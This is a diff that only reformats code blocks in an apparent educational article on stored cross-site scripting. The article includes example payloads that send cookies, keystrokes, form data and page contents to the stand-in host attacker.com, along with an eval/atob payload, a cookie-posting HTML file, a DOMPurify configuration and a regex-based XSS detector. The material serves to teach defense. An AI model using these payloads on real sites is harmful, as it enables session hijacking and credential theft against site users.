@@ -12,6 +12,7 @@ tags:
 Stored Cross-Site Scripting (XSS) is a persistent web application vulnerability where malicious scripts are permanently stored on the target server (in databases, files, or other storage mechanisms) and subsequently served to users without proper sanitization. Unlike reflected XSS, which requires user interaction with a malicious link, stored XSS affects all users who access the compromised content, making it significantly more dangerous.
 
 **Attack Persistence:** The malicious payload remains dormant until accessed, potentially affecting hundreds or thousands of users over time. This persistence makes stored XSS particularly valuable for:
+
 - **Session Hijacking:** Stealing authentication cookies and tokens
 - **Credential Harvesting:** Capturing login credentials through fake forms
 - **Malware Distribution:** Redirecting users to exploit kits
@@ -23,7 +24,9 @@ Stored Cross-Site Scripting (XSS) is a persistent web application vulnerability 
 Attacker submits malicious content through comment forms, user profiles, or message boards:
 
 ```html
-<script>alert('Stored XSS');</script>
+<script>
+  alert("Stored XSS")
+</script>
 ```
 
 When the application stores this input and displays it to other users without proper encoding, the script executes in victims' browsers.
@@ -33,19 +36,19 @@ When the application stores this input and displays it to other users without pr
 ```html
 <!-- Cookie stealing payload -->
 <script>
-document.location='http://attacker.com/steal.php?cookie='+document.cookie;
+  document.location = "http://attacker.com/steal.php?cookie=" + document.cookie
 </script>
 
 <!-- Keylogger payload -->
 <script>
-document.addEventListener('keypress', function(e) {
-    new Image().src = 'http://attacker.com/log.php?key=' + e.key;
-});
+  document.addEventListener("keypress", function (e) {
+    new Image().src = "http://attacker.com/log.php?key=" + e.key
+  })
 </script>
 
 <!-- Form hijacking payload -->
 <script>
-document.forms[0].action = 'http://attacker.com/harvest.php';
+  document.forms[0].action = "http://attacker.com/harvest.php"
 </script>
 ```
 
@@ -61,12 +64,13 @@ Attackers inject malicious code into user profile fields that are displayed to o
 <img src="x" onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))" />
 
 <!-- SVG-based persistent payload -->
-<svg onload="fetch('http://attacker.com/steal.php?data='+btoa(document.cookie))">
-</svg>
+<svg onload="fetch('http://attacker.com/steal.php?data='+btoa(document.cookie))"></svg>
 
 <!-- CSS-based attack -->
 <style>
-body { background: url('javascript:alert("XSS")'); }
+  body {
+    background: url('javascript:alert("XSS")');
+  }
 </style>
 ```
 
@@ -75,14 +79,19 @@ body { background: url('javascript:alert("XSS")'); }
 ```html
 <!-- Comprehensive session hijacking payload -->
 <script>
-(function() {
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', 'http://attacker.com/collect.php', true);
-    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    xhr.send('cookies=' + encodeURIComponent(document.cookie) +
-             '&url=' + encodeURIComponent(window.location.href) +
-             '&useragent=' + encodeURIComponent(navigator.userAgent));
-})();
+  ;(function () {
+    var xhr = new XMLHttpRequest()
+    xhr.open("POST", "http://attacker.com/collect.php", true)
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
+    xhr.send(
+      "cookies=" +
+        encodeURIComponent(document.cookie) +
+        "&url=" +
+        encodeURIComponent(window.location.href) +
+        "&useragent=" +
+        encodeURIComponent(navigator.userAgent),
+    )
+  })()
 </script>
 ```
 
@@ -107,17 +116,22 @@ fetch('http://attacker.com/exfiltrate.php?data=' + btoa(document.body.innerHTML)
 ```html
 <!DOCTYPE html>
 <html>
-<head><title>Innocent Document</title></head>
-<body>
-<h1>Important Document</h1>
-<script>
-// Payload executes when file is viewed
-parent.postMessage({
-    type: 'xss',
-    payload: document.cookie
-}, '*');
-</script>
-</body>
+  <head>
+    <title>Innocent Document</title>
+  </head>
+  <body>
+    <h1>Important Document</h1>
+    <script>
+      // Payload executes when file is viewed
+      parent.postMessage(
+        {
+          type: "xss",
+          payload: document.cookie,
+        },
+        "*",
+      )
+    </script>
+  </body>
 </html>
 ```
 
@@ -167,16 +181,16 @@ safe_content = sanitize_user_input(request.form['user_comment'])
 ```javascript
 // Configure DOMPurify for safe HTML rendering
 const cleanConfig = {
-    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a'],
-    ALLOWED_ATTR: ['href', 'title', 'class'],
-    FORBID_SCRIPTS: true,
-    FORBID_TAGS: ['script', 'object', 'embed', 'base', 'link'],
-    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'style']
-};
+  ALLOWED_TAGS: ["p", "br", "strong", "em", "ul", "ol", "li", "a"],
+  ALLOWED_ATTR: ["href", "title", "class"],
+  FORBID_SCRIPTS: true,
+  FORBID_TAGS: ["script", "object", "embed", "base", "link"],
+  FORBID_ATTR: ["onerror", "onload", "onclick", "style"],
+}
 
 function renderUserContent(htmlContent) {
-    const clean = DOMPurify.sanitize(htmlContent, cleanConfig);
-    document.getElementById('content').innerHTML = clean;
+  const clean = DOMPurify.sanitize(htmlContent, cleanConfig)
+  document.getElementById("content").innerHTML = clean
 }
 ```
 
@@ -316,48 +330,48 @@ def secure_file_upload(file):
 
 ```javascript
 class XSSDetector {
-    constructor() {
-        this.suspiciousPatterns = [
-            /<script[^>]*>.*?<\/script>/gi,
-            /javascript:/gi,
-            /on\w+\s*=/gi,
-            /<iframe[^>]*>.*?<\/iframe>/gi,
-            /eval\s*\(/gi,
-            /expression\s*\(/gi
-        ];
-    }
+  constructor() {
+    this.suspiciousPatterns = [
+      /<script[^>]*>.*?<\/script>/gi,
+      /javascript:/gi,
+      /on\w+\s*=/gi,
+      /<iframe[^>]*>.*?<\/iframe>/gi,
+      /eval\s*\(/gi,
+      /expression\s*\(/gi,
+    ]
+  }
 
-    detectXSS(input) {
-        for (let pattern of this.suspiciousPatterns) {
-            if (pattern.test(input)) {
-                this.logSuspiciousActivity(input);
-                return true;
-            }
-        }
-        return false;
+  detectXSS(input) {
+    for (let pattern of this.suspiciousPatterns) {
+      if (pattern.test(input)) {
+        this.logSuspiciousActivity(input)
+        return true
+      }
     }
+    return false
+  }
 
-    logSuspiciousActivity(payload) {
-        fetch('/api/security/log', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                type: 'xss_attempt',
-                payload: payload,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                url: window.location.href
-            })
-        });
-    }
+  logSuspiciousActivity(payload) {
+    fetch("/api/security/log", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        type: "xss_attempt",
+        payload: payload,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        url: window.location.href,
+      }),
+    })
+  }
 }
 
 // Usage
-const xssDetector = new XSSDetector();
-document.addEventListener('input', function(e) {
-    if (xssDetector.detectXSS(e.target.value)) {
-        e.target.value = '';
-        alert('Potentially malicious input detected and removed.');
-    }
-});
+const xssDetector = new XSSDetector()
+document.addEventListener("input", function (e) {
+  if (xssDetector.detectXSS(e.target.value)) {
+    e.target.value = ""
+    alert("Potentially malicious input detected and removed.")
+  }
+})
 ```
